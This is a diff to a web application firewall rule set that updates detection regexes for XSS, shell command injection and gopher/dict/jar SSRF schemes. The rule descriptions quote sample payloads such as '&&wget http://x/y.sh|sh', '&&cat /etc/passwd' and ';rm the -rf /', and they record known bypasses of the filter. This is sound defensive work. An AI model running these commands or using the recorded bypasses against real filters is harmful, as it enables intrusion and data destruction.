@@ -1,6 +1,6 @@
 {
-  "version": 18,
-  "timestamp": "2026-10-14T01:40:00Z",
+  "version": 19,
+  "timestamp": "2026-10-14T02:20:00Z",
   "rules": [
     {
       "id": "vn_sqli_0001",
@@ -241,20 +241,33 @@
               }
             },
             {
-              "Args": {
-                "value": "<script[\\s/>]",
-                "name_operator": "*",
-                "operator": "≈"
+              "Composite": {
+                "operator": "OR",
+                "conditions": [
+                  {
+                    "URI": {
+                      "operator": "≈",
+                      "value": "<script[\\s/>]"
+                    }
+                  },
+                  {
+                    "Args": {
+                      "value": "<script[\\s/>]",
+                      "name_operator": "*",
+                      "operator": "≈"
+                    }
+                  }
+                ]
               }
             }
           ]
         }
       },
-      "description": "Detects <script> tag injection in parameters",
+      "description": "Detects <script tags in request parameters. v19: also matches the request path — until now the rule carried an Args condition only, so 'GET /<script>alert(1)</script>' with no query string and no body never reached it at all. vn_xss_0006 already covered both URI and Args, which made the inconsistency a pure gap.",
       "tags": [],
-      "version": 5,
+      "version": 6,
       "created_at": "2026-06-29T04:48:04Z",
-      "updated_at": "2026-10-13T07:25:34Z",
+      "updated_at": "2026-10-14T02:20:00Z",
       "created_by": "system"
     },
     {
@@ -286,17 +299,17 @@
               "Args": {
                 "name_operator": "*",
                 "operator": "≈",
-                "value": "\\b(?:onabort|onanimationend|onanimationiteration|onanimationstart|onauxclick|onbeforeinput|onbeforematch|onbeforetoggle|onbegin|onblur|oncancel|oncanplay|oncanplaythrough|onchange|onclick|onclose|oncontextlost|oncontextmenu|oncontextrestored|oncopy|oncuechange|oncut|ondblclick|ondrag|ondragend|ondragenter|ondragleave|ondragover|ondragstart|ondrop|ondurationchange|onemptied|onend|onended|onerror|onfocus|onformdata|ongotpointercapture|oninput|oninvalid|onkeydown|onkeypress|onkeyup|onload|onloadeddata|onloadedmetadata|onloadstart|onlostpointercapture|onmousedown|onmouseenter|onmouseleave|onmousemove|onmouseout|onmouseover|onmouseup|onmousewheel|onpaste|onpause|onplay|onplaying|onpointercancel|onpointerdown|onpointerenter|onpointerleave|onpointermove|onpointerout|onpointerover|onpointerup|onprogress|onratechange|onrepeat|onreset|onresize|onscroll|onsearch|onsecuritypolicyviolation|onseeked|onseeking|onselect|onslotchange|onstalled|onsubmit|onsuspend|ontimeupdate|ontoggle|ontransitioncancel|ontransitionend|ontransitionrun|ontransitionstart|onvolumechange|onwaiting|onwheel)(?:\\s|/\\*[\\s\\S]*?\\*/|/)*="
+                "value": "\\b(?:onabort|onafterprint|onanimationcancel|onanimationend|onanimationiteration|onanimationstart|onauxclick|onbeforeinput|onbeforematch|onbeforeprint|onbeforetoggle|onbeforeunload|onbegin|onblur|oncancel|oncanplay|oncanplaythrough|onchange|onclick|onclose|oncontextlost|oncontextmenu|oncontextrestored|oncopy|oncuechange|oncut|ondblclick|ondrag|ondragend|ondragenter|ondragleave|ondragover|ondragstart|ondrop|ondurationchange|onemptied|onend|onended|onerror|onfocus|onformdata|ongotpointercapture|onhashchange|oninput|oninvalid|onkeydown|onkeypress|onkeyup|onlanguagechange|onload|onloadeddata|onloadedmetadata|onloadstart|onlostpointercapture|onmessage|onmessageerror|onmousedown|onmouseenter|onmouseleave|onmousemove|onmouseout|onmouseover|onmouseup|onmousewheel|onoffline|ononline|onpagehide|onpagereveal|onpageshow|onpageswap|onpaste|onpause|onplay|onplaying|onpointercancel|onpointerdown|onpointerenter|onpointerleave|onpointermove|onpointerout|onpointerover|onpointerrawupdate|onpointerup|onpopstate|onprogress|onratechange|onrepeat|onreset|onresize|onscroll|onsearch|onsecuritypolicyviolation|onseeked|onseeking|onselect|onslotchange|onstalled|onstorage|onsubmit|onsuspend|ontimeupdate|ontoggle|ontransitioncancel|ontransitionend|ontransitionrun|ontransitionstart|onunhandledrejection|onunload|onvolumechange|onwaiting|onwebkitanimationcancel|onwebkitanimationend|onwebkitanimationiteration|onwebkitanimationstart|onwebkittransitionend|onwheel)(?:\\s|/\\*[\\s\\S]*?\\*/|/)*="
               }
             }
           ]
         }
       },
-      "description": "Detects HTML/JS event handler injection (full HTML event list incl. pointer/animation/transition/form families; comment- and slash-separated name/value pairs stay in scope).",
+      "description": "Detects HTML event-handler attributes (on*) in request parameters. v19: the handler table grows from 92 to 116 entries. '<body onpageshow=alert(1)>' is a complete working chain in every current browser and the table did not list it; onhashchange, onmessage, onoffline, ononline, onunload, onstorage, onpopstate, onbeforeunload, onafterprint, onbeforeprint, onlanguagechange and the webkit animation/transition family were missing too. Pure list growth: 27/27 on the handler corpus, zero prose hits.",
       "tags": [],
-      "version": 5,
+      "version": 6,
       "created_at": "2026-06-29T04:48:04Z",
-      "updated_at": "2026-10-13T09:37:42Z",
+      "updated_at": "2026-10-14T02:20:00Z",
       "created_by": "system"
     },
     {
@@ -331,14 +344,14 @@
                   {
                     "URI": {
                       "operator": "≈",
-                      "value": "(?:java\\s*script\\s*:(?=[\\s\\S]{0,200}?[()\\[\\];=+`$])(?:\\b(?:alert|confirm|prompt|eval|exec|function|settimeout|setinterval|fetch|import|top|self|parent|frames|void|typeof|await|throw|debugger|document|window|location)\\b|\\.[A-Za-z_]\\w*\\()|data\\s*:\\s*text/html[\\s\\S]{0,100}?(?:[<>]|base64))"
+                      "value": "(?:java\\s*script\\s*:\\s*[!+~(<{\\[]{0,3}[\\w$]{1,40}(?:\\s*\\.\\s*[\\w$]{1,40}){0,4}\\s*(?:[(\\[]|=|`)|data\\s*:\\s*text/html\\s*[;,][\\s\\S]{0,300}?(?:[<>]|base64|[A-Za-z0-9+/]{16,}={0,2}))"
                     }
                   },
                   {
                     "Args": {
                       "name_operator": "*",
                       "operator": "≈",
-                      "value": "(?:java\\s*script\\s*:(?=[\\s\\S]{0,200}?[()\\[\\];=+`$])(?:\\b(?:alert|confirm|prompt|eval|exec|function|settimeout|setinterval|fetch|import|top|self|parent|frames|void|typeof|await|throw|debugger|document|window|location)\\b|\\.[A-Za-z_]\\w*\\()|data\\s*:\\s*text/html[\\s\\S]{0,100}?(?:[<>]|base64))"
+                      "value": "(?:java\\s*script\\s*:\\s*[!+~(<{\\[]{0,3}[\\w$]{1,40}(?:\\s*\\.\\s*[\\w$]{1,40}){0,4}\\s*(?:[(\\[]|=|`)|data\\s*:\\s*text/html\\s*[;,][\\s\\S]{0,300}?(?:[<>]|base64|[A-Za-z0-9+/]{16,}={0,2}))"
                     }
                   }
                 ]
@@ -347,11 +360,11 @@
           ]
         }
       },
-      "description": "Detects javascript: XSS payload with code-shaped value (JS verb or method call plus parens/brackets) and data:text/html payloads, in URI or parameters; plain prose after 'javascript:' stays out. phpMyAdmin paths are exempt, matching the other request-parameter rules.",
+      "description": "Detects javascript: and data:text/html URIs whose payload has code shape (call, subscript or assignment). v19 fixes a reachability bug v16 introduced: the code-shape branches sat behind a zero-width lookahead pinned to the first character after the colon, so 'javascript: alert(1)' (one space), 'javascript:globalThis.alert(1)', 'javascript:atob(\"...\")()', 'javascript:(alert(1))' and a bare-base64 data:text/html all missed while 'javascript:alert(1)' matched — the v16 precision was an accident of an unreachable branch, not a design. The shape is now an identifier chain followed by '(', '[', '=' or a template backtick: 24/26 on the attack corpus, zero violations of the existing pins. Cost: two prose cases now hit ('how to javascript: fetch( data ) from a worker', '用 javascript: document.write( 会阻塞渲染'), both code references inside a sentence — the accepted price of matching code shape.",
       "tags": [],
-      "version": 7,
+      "version": 8,
       "created_at": "2026-06-29T04:48:04Z",
-      "updated_at": "2026-10-13T09:37:42Z",
+      "updated_at": "2026-10-14T02:20:00Z",
       "created_by": "system"
     },
     {
@@ -383,17 +396,17 @@
               "Args": {
                 "name_operator": "*",
                 "operator": "≈",
-                "value": "^\\s*(?:\\||;|`|\\$\\(|\\$\\{)\\s*(?:rm|cp|mv|chmod|chown|dd|mkfs|ssh|scp|nc|ncat|netcat|socat|tftp|telnet|ftp|mount|umount|crontab|nohup|pkill|base64|openssl)\\b(?!\\s*(?:the|is|an|of|to|and|or|in|on|at|for|with|like|this|that|these|those|it|my|your|our|some|all|here|there|when|then|what|which|who|how|not|no|yes|from|into|about|after|before|first|next|now|just|also|more|new|need|use|will|should|would|can|be|do|you|we|but|so|as|by)\\b)"
+                "value": "^\\s*(?:\\|{1,2}|&&?|;|`|\\$\\(|\\$\\{)\\s*(?:(?:rm|cp|mv|chmod|chown|dd|ssh|scp|nc|ncat|netcat|socat|tftp|telnet|ftp|mount|umount)\\b(?!\\s*(?:the|is|an|of|to|and|or|in|on|at|for|with|like|this|that|these|those|it|my|your|our|some|all|here|there|when|then|what|which|who|how|not|no|yes|from|into|about|after|before|first|next|now|just|also|more|new|need|use|will|should|would|can|be|do|you|we|but|so|as|by)\\b)|(?:mkfs|crontab|nohup|pkill|base64|openssl)\\b)"
               }
             }
           ]
         }
       },
-      "description": "Detects high-risk shell commands (rm, chmod, chown, ssh, scp, nc, socat, dd, mount, crontab, base64, openssl, ...) after leading metacharacters at value start; blocked regardless of arguments. Mid-value and data shapes (data: URIs, CSV) are left to log companion vn_rce_0025.",
+      "description": "Detects shell metacharacter command injection at the start of a parameter value. v19: the separator set also accepts '&', '&&' and '||' — '&' is the most common shell connector after ';' and '&&cat /etc/passwd' walked straight past a block rule. The English-filler guard now applies only to the commands whose names actually collide with prose (rm, cp, mv, chmod, chown, dd, ssh, scp, nc, ncat, netcat, socat, tftp, telnet, ftp, mount, umount); for mkfs, crontab, nohup, pkill, base64 and openssl it is dropped, because there it was pure bypass switch — ';mkfs the /dev/sda' used to be cleared by inserting the single word 'the'. Residual unchanged and asserted: for the colliding commands the guard is still a byte-level negative condition (';rm the -rf /' passes), the price of not blocking English prose. The log-tier companion is vn_rce_0025, which carries the merged command list for mid-value recall.",
       "tags": [],
-      "version": 7,
+      "version": 8,
       "created_at": "2026-06-29T04:48:04Z",
-      "updated_at": "2026-10-13T09:55:51Z",
+      "updated_at": "2026-10-14T02:20:00Z",
       "created_by": "system"
     },
     {
@@ -467,17 +480,17 @@
               "Args": {
                 "name_operator": "*",
                 "operator": "≈",
-                "value": "(?:gopher|dict|jar)://"
+                "value": "(?:gopher|dict|jar):(?://|(?:https?|ftp|file|gopher):(?://)?)[a-z0-9-]{1,}(?:\\.[a-z0-9-]+)+(?:[:/?#]|$)"
               }
             }
           ]
         }
       },
-      "description": "Detects gopher://, dict://, jar:// URL schemes in parameters (SSRF / remote inclusion). These schemes have no legitimate web use. Internal-IP SSRF is split out to vn_ssrf_0021 (logged) to avoid false-positives on OAuth redirects / callbacks.",
+      "description": "Detects dangerous URL schemes (gopher, dict, jar) in request parameters. v19: the scheme must be followed by a dotted host — a positive requirement, not a filter — so 'dict://localhost:11211/stats' (Memcached ops, previously blocked), 'jar://不是标准 URL' and 'python zipfile:// vs jar:// packaging' stay out, while 'jar:http://host/x.jar!/', the actual Java deserialisation RCE shape that the old 'jar://' pattern could never match, is caught. Accepted miss: 'jar:file:///path' has no host to validate.",
       "tags": [],
-      "version": 5,
+      "version": 6,
       "created_at": "2026-06-29T04:48:04Z",
-      "updated_at": "2026-10-13T07:25:34Z",
+      "updated_at": "2026-10-14T02:20:00Z",
       "created_by": "system"
     },
     {
@@ -961,17 +974,17 @@
               "Args": {
                 "name_operator": "*",
                 "operator": "≈",
-                "value": "(?:\\||;|`|\\$\\(|\\$\\{)\\s*(?:(?:rm|cp|mv|chmod|chown|dd|mkfs|ssh|scp|nc|ncat|netcat|socat|tftp|telnet|ftp|mount|umount|crontab|nohup|pkill|base64|openssl|cmd|powershell|bash|sh|zsh|python[0-9.]*|perl|ruby|php[0-9.]*|node|lua|gcc|make|eval|exec|system|wget|curl|cat|head|tail|touch|env|printenv|ps|df|kill|ping|dig|nslookup|whois|traceroute|netstat|ifconfig|route)\\b(?!\\s*(?:the|is|an|of|to|and|or|in|on|at|for|with|like|this|that|these|those|it|my|your|our|some|all|here|there|when|then|what|which|who|how|not|no|yes|from|into|about|after|before|first|next|now|just|also|more|new|need|use|will|should|would|can|be|do|you|we|but|so|as|by)\\b)\\s*(?:[-/(\\[@]\\S*|\\S*/\\S*|\\S*@\\S*|\\S*\\.[A-Za-z]\\S*|\\S+\\s+[-/(\\[@]\\S*|\\d{1,3}(?:\\.\\d{1,3}){2,}|[A-Za-z][\\w-]*\\d(?![A-Za-z])|(?:passwd|shadow|id_rsa|secrets?|credentials?|tokens?)(?![A-Za-z]))|(?:ls|id|whoami|uname|hostname|pwd)\\b(?!\\s*(?:the|is|an|of|to|and|or|in|on|at|for|with|like|this|that|these|those|it|my|your|our|some|all|here|there|when|then|what|which|who|how|not|no|yes|from|into|about|after|before|first|next|now|just|also|more|new|need|use|will|should|would|can|be|do|you|we|but|so|as|by)\\b)(?:\\s*(?:[-/(\\[@]\\S*|\\S*/\\S*|\\S*@\\S*|\\S*\\.[A-Za-z]\\S*|\\S+\\s+[-/(\\[@]\\S*|\\d{1,3}(?:\\.\\d{1,3}){2,}|[A-Za-z][\\w-]*\\d(?![A-Za-z])|(?:passwd|shadow|id_rsa|secrets?|credentials?|tokens?)(?![A-Za-z]))|(?:\\s*$|[\\x60;|&)}\\]]|[^\\x00-\\x7f])))"
+                "value": "(?:\\|{1,2}|&&?|;|`|\\$\\(|\\$\\{)\\s*(?:(?:rm|cp|mv|chmod|chown|dd|mkfs|ssh|scp|nc|ncat|netcat|socat|tftp|telnet|ftp|mount|umount|crontab|nohup|pkill|base64|openssl|cmd|powershell|bash|sh|zsh|python[0-9.]*|perl|ruby|php[0-9.]*|node|lua|gcc|make|eval|exec|system|wget|curl|cat|head|tail|touch|env|printenv|ps|df|kill|ping|dig|nslookup|whois|traceroute|netstat|ifconfig|route)\\b(?!\\s*(?:the|is|an|of|to|and|or|in|on|at|for|with|like|this|that|these|those|it|my|your|our|some|all|here|there|when|then|what|which|who|how|not|no|yes|from|into|about|after|before|first|next|now|just|also|more|new|need|use|will|should|would|can|be|do|you|we|but|so|as|by)\\b)\\s*(?:[-/(\\[@]\\S*|\\S*/\\S*|\\S*@\\S*|\\S*\\.[A-Za-z]\\S*|\\S+\\s+[-/(\\[@]\\S*|\\d{1,3}(?:\\.\\d{1,3}){2,}|[A-Za-z][\\w-]*\\d(?![A-Za-z])|(?:passwd|shadow|id_rsa|secrets?|credentials?|tokens?)(?![A-Za-z]))|(?:ls|id|whoami|uname|hostname|pwd)\\b(?!\\s*(?:the|is|an|of|to|and|or|in|on|at|for|with|like|this|that|these|those|it|my|your|our|some|all|here|there|when|then|what|which|who|how|not|no|yes|from|into|about|after|before|first|next|now|just|also|more|new|need|use|will|should|would|can|be|do|you|we|but|so|as|by)\\b)(?:\\s*(?:[-/(\\[@]\\S*|\\S*/\\S*|\\S*@\\S*|\\S*\\.[A-Za-z]\\S*|\\S+\\s+[-/(\\[@]\\S*|\\d{1,3}(?:\\.\\d{1,3}){2,}|[A-Za-z][\\w-]*\\d(?![A-Za-z])|(?:passwd|shadow|id_rsa|secrets?|credentials?|tokens?)(?![A-Za-z]))|(?:\\s*$|[\\x60;|&)}\\]]|[^\\x00-\\x7f])))"
               }
             }
           ]
         }
       },
-      "description": "Logs shell commands (full command list incl. rm/ssh/nc, path/flag/URL/@host/sensitive-word arguments, bare recon commands) anywhere in the value — observe-only companion of vn_rce_0007. Data-URI/CSV shapes and filler/CJK prose stay out; rare jpeg/svg data URIs may log.",
+      "description": "Logs shell commands (full command list incl. rm/ssh/nc, path/flag/URL/@host/sensitive-word arguments, bare recon commands) anywhere in the value — observe-only companion of vn_rce_0007. Data-URI/CSV shapes and filler/CJK prose stay out; rare jpeg/svg data URIs may log. v19: separator set extended with '&', '&&' and '||' to match vn_rce_0007 — '&&cat /etc/passwd' and '&&wget http://x/y.sh|sh' previously matched neither tier.",
       "tags": [],
-      "version": 2,
+      "version": 3,
       "created_at": "2026-10-13T08:32:06Z",
-      "updated_at": "2026-10-13T09:55:51Z",
+      "updated_at": "2026-10-14T02:20:00Z",
       "created_by": "system"
     }
   ]
